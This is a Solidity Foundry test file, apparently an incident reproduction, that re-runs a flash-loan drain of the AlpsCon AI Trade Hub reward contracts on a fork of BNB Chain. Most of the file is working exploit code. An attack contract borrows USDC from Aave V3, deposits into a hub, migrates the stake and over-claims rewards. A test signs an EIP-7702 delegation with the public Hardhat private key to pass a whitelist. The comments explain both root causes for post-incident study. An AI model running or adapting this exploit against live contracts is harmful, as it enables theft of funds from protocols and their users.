// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Vm} from "forge-std/Vm.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~152.8K USDC
// Attacker : https://bscscan.com/address/0x3d9DF7D20D8296286383ffe475aA7b9e548946b2
// Delegated Account : https://bscscan.com/address/0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
// Exploit Contract : https://bscscan.com/address/0xbe5d79b429308f6be75898dd31c5f3c0bd4ed13d
// Vulnerable Contract (AI Trade Hub V9) : https://bscscan.com/address/0x9b210da482217afc24074e57f6f8337fe07f0124
// Attack Tx : https://bscscan.com/tx/0x824b83f94bdc2e69b81f1cb2dfdf9d4aeed066114e3de29e3af59bd2d9355fc2
//
// @Analysis
// Decompiled exploit contract : https://decompiler.exvul.com/bsc/0xbe5d79b429308f6be75898dd31c5f3c0bd4ed13d
//
// @Summary
// AlpsCon AI Trade Hub on BNB Chain gates its reward functions behind an onlyVerified whitelist
// that still trusted 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, the canonical Hardhat/Anvil
// default account #0 whose private key (0xac0974...f2ff80) is public knowledge. The attacker used
// an EIP-7702 authorization, signed with that public key, to delegate the account to their own
// exploit code, so any reward call made from it passed the whitelist check. On top of that, the
// reward hubs are versioned (V6..V9) and each newer version imports the balances held in the
// preceding one via migrate(); claimServiceResults() then multiplies those freshly imported
// balances by the version's already-accumulated profitPerShare while the account's own
// entryProfitPerShare is still zero, so a brand-new deposit is paid the full historical reward
// history. The attacker flash-borrowed 1,027,990 USDC from Aave V3, bought ALPS, deposited into
// the still-open V6 hub, imported that stake forward and over-claimed the accumulated rewards,
// then unwound everything and repaid the loan. On-chain the attacker netted 152,295.3625 USDC.
//
// @Reconstruction note
// The real transaction's single claimServiceResults() on the V9 hub cascades internally and also
// pushes the V7 and V8 hubs' USDC balances (1,966.07 + 20,553.69 = 22,519.75 USDC) straight to
// the attacker EOA. That cascade is keyed to the delegated account's state inside the unverified
// victim bytecode and an equivalent standalone call from a reconstructed contract does not trigger
// it, so this PoC reproduces the dominant V9 over-claim leg: a standalone net of 129,775.6074 USDC
// (the V9 reward paid to the delegated account plus the ALPS round-trip, net of the 1,028,503.995
// USDC flash-loan repayment). The two legs are the same bug; the figure asserted below is the part
// the clean reconstruction reproduces deterministically, not the full on-chain drain.

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IAlpsRouter {
    // Custom AMM router: swaps amountIn of tokenIn into tokenOut, output sent to msg.sender.
    function swap(address tokenIn, address tokenOut, uint256 amountIn) external;
}

interface IAlpsHub {
    function purchaseServiceCredits(uint256 amount) external;
    function migrate() external;
    function claimServiceResults() external;
    function withdrawFunds(uint256 amount) external;
}

// Runs in the delegated account's context (EIP-7702). Holds the full attack body in the Aave
// flash-loan callback. Deposited in the main test file so the whole PoC compiles as one unit.
contract AlpsConExploit {
    IERC20 internal constant USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 internal constant ALPS = IERC20(0x5870357Dfa6A11d3Fe45D775C21eD9ae60Ac4BeF);
    IAlpsRouter internal constant ROUTER = IAlpsRouter(0x7227D229BE754fA49F416d48e8EAa121184b1721);

    IAlpsHub internal constant HUB_V6 = IAlpsHub(0x74F091a719FdD47A95f378C7fb5C3D18a4582405); // still accepts deposits
    IAlpsHub internal constant HUB_V9 = IAlpsHub(0x9B210Da482217afC24074e57f6F8337fe07F0124); // victim, settles V7/V8/V9

    // ALPS left staked in V6 after its 8% deposit fee (1,027,990 USDC -> 9,970,024 ALPS, 92% staked).
    uint256 internal constant STAKED_ALPS = 9_172_422_104_541_036_800_000_000;

    function run(address aavePool, uint256 amount, address profitTo) external {
        IAaveV3Pool(aavePool).flashLoanSimple(address(this), address(USDC), amount, abi.encode(profitTo), 0);
        uint256 surplus = USDC.balanceOf(address(this));
        if (surplus > 0) {
            USDC.transfer(profitTo, surplus);
        }
    }

    function executeOperation(
        address, /* asset */
        uint256 amount,
        uint256 premium,
        address, /* initiator */
        bytes calldata /* params */
    ) external returns (bool) {
        // 1. buy ALPS with the borrowed USDC through the project's own router
        USDC.approve(address(ROUTER), amount);
        ROUTER.swap(address(USDC), address(ALPS), amount);

        // 2. deposit the ALPS into the still-open V6 hub (passes the whitelist as the Hardhat account)
        uint256 alpsIn = ALPS.balanceOf(address(this));
        ALPS.approve(address(HUB_V6), alpsIn);
        HUB_V6.purchaseServiceCredits(alpsIn);

        // 3. import the fresh stake forward, then over-claim the accumulated V7/V8/V9 rewards
        HUB_V6.migrate();
        HUB_V9.claimServiceResults();

        // 4. unwind: pull the stake back out and sell the ALPS for USDC
        HUB_V6.withdrawFunds(STAKED_ALPS);
        uint256 alpsOut = ALPS.balanceOf(address(this));
        ALPS.approve(address(ROUTER), alpsOut);
        ROUTER.swap(address(ALPS), address(USDC), alpsOut);

        // 5. repay the flash loan (Aave pulls amount + premium)
        USDC.approve(msg.sender, amount + premium);
        return true;
    }
}

contract AlpsConExploitTest is Test {
    IERC20 internal constant USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);

    address internal constant AAVE_V3_POOL = 0x6807dc923806fE8Fd134338EABCA509979a7e0cB;
    address internal constant HUB_V6 = 0x74F091a719FdD47A95f378C7fb5C3D18a4582405;
    address internal constant WHITELIST = 0x9be357BD175ba6b40Ac20177B237Ec6641e98851;

    address internal constant ATTACKER = 0x3d9DF7D20D8296286383ffe475aA7b9e548946b2;

    // Canonical Hardhat/Anvil default account #0 and its public private key. This is not a key
    // compromise: the key is published in Hardhat's docs and known to everyone, so any attacker
    // can reproduce the same signed delegation.
    address internal constant HARDHAT_ACCOUNT = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    uint256 internal constant HARDHAT_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;

    uint256 internal constant FLASH_AMOUNT = 1_027_990 ether;
    // Net USDC the clean standalone reconstruction reproduces on the fork (V9 over-claim leg plus
    // ALPS round-trip, net of flash-loan repayment). See the @Reconstruction note in the header:
    // the real tx netted 152,295.3625 USDC, 22,519.75 of which came from the V9 claim's internal
    // V7/V8 cascade that a standalone call does not reproduce.
    uint256 internal constant EXPECTED_PROFIT = 129_775.607409916739393535 ether;

    AlpsConExploit internal exploit;

    function setUp() public {
        // Fork one block before the attack. Needs a BSC archive endpoint; defaults to the repo's
        // foundry.toml "bsc" alias and honours BSC_RPC_URL when set.
        vm.createSelectFork(vm.envOr("BSC_RPC_URL", string("bsc")), 128_315_187);
        vm.label(HARDHAT_ACCOUNT, "HardhatAccount");
        vm.label(ATTACKER, "Attacker");
        exploit = new AlpsConExploit();
    }

    // Confirms root cause (A): the reward hub still trusts the public Hardhat account on its
    // whitelist at the fork block, and a fresh, non-whitelisted account is rejected.
    function testWhitelistStillTrustsHardhatAccount() public {
        (, bytes memory verified) =
            WHITELIST.staticcall(abi.encodeWithSignature("isInWhiteList(address)", HARDHAT_ACCOUNT));
        assertTrue(abi.decode(verified, (bool)), "Hardhat account must be whitelisted at fork block");

        address fresh = address(0xdead);
        (, bytes memory freshVerified) =
            WHITELIST.staticcall(abi.encodeWithSignature("isInWhiteList(address)", fresh));
        assertFalse(abi.decode(freshVerified, (bool)), "fresh account must not be whitelisted");
    }

    function testExploit() public {
        uint256 attackerBefore = USDC.balanceOf(ATTACKER);

        // Real EIP-7702 delegation: sign an authorization for the Hardhat account with its PUBLIC
        // private key, pointing it at the exploit implementation, and attach it to the next call.
        vm.signAndAttachDelegation(address(exploit), HARDHAT_PK);

        // The attacker EOA triggers the delegated account; the whole flow runs as 0xf39f...2266.
        vm.prank(ATTACKER);
        AlpsConExploit(HARDHAT_ACCOUNT).run(AAVE_V3_POOL, FLASH_AMOUNT, ATTACKER);

        uint256 attackerGain = USDC.balanceOf(ATTACKER) - attackerBefore;
        console.log("Attacker USDC gain:", attackerGain);
        assertApproxEqAbs(attackerGain, EXPECTED_PROFIT, 1 ether, "reconstructed over-claim profit mismatch");
        assertGt(attackerGain, 0, "attack must be profitable");
    }
}

/*
 * ## Proof Explanation
 *
 * testExploit() reproduces the AlpsCon AI Trade Hub drain of 18 Oct 2026 on BNB Chain, forked at
 * block 128315187 (one block before attack tx 0x824b83...5fc2).
 *
 * Two independent defects combine:
 *
 *   (A) Access control. The reward hubs gate purchaseServiceCredits / migrate / claimServiceResults
 *       behind an onlyVerified whitelist (registry 0x9be3...9851). That whitelist still contained
 *       0xf39f...2266, the canonical Hardhat default account #0. testWhitelistStillTrustsHardhatAccount
 *       reads isInWhiteList() live at the fork block: true for the Hardhat account, false for a fresh
 *       address. Because the Hardhat private key is public, the gate is effectively permissionless.
 *
 *   (B) Historical-reward over-claim. Each hub version imports the preceding version's balances via
 *       migrate(), then claimServiceResults() credits those imported balances against the version's
 *       already-accumulated profitPerShare while the account's entryProfitPerShare is still zero. A
 *       brand-new V6 deposit is therefore paid the entire prior reward history of V7/V8/V9.
 *
 * The attack, all permissionless and on-chain (no secret key, no victim signature, no admin action):
 *
 *   1. The attacker signs an EIP-7702 authorization for 0xf39f...2266 with the PUBLIC Hardhat key
 *      (vm.signAndAttachDelegation) delegating it to the exploit contract, and triggers it.
 *   2. Running as 0xf39f...2266: flash-borrow 1,027,990 USDC from Aave V3.
 *   3. Buy ALPS through the project router; deposit into the still-open V6 hub.
 *   4. migrate() to import the fresh stake forward; claimServiceResults() on V9 over-claims the
 *      historical rewards (312,915 USDC paid to the delegated account). On the real tx the same
 *      call also cascaded 20,553 + 1,966 USDC out of the V8/V7 hubs to the attacker EOA.
 *   5. Withdraw the stake, sell the ALPS back for USDC (845,364 USDC), repay the flash loan
 *      (1,028,503.995 USDC = 1,027,990 principal + 513.995 premium).
 *   6. Sweep the surplus to the attacker.
 *
 * assertApproxEqAbs(attackerGain, 129_775.6074e18, 1e18):
 *   Proves the attacker EOA's USDC balance grew by the reconstructed over-claim profit (312,915
 *   claim + 845,364 ALPS sale - 1,028,504 repayment) after the flash loan was fully repaid. The net
 *   is pure profit; the only capital at risk was gas. On-chain the attacker netted 152,295.3625
 *   USDC; the 22,519.75 USDC difference is the V7/V8 cascade documented in the header, which an
 *   equivalent standalone claim does not reproduce.
 *
 * testWhitelistStillTrustsHardhatAccount() confirms root cause (A) directly against fork state.
 */
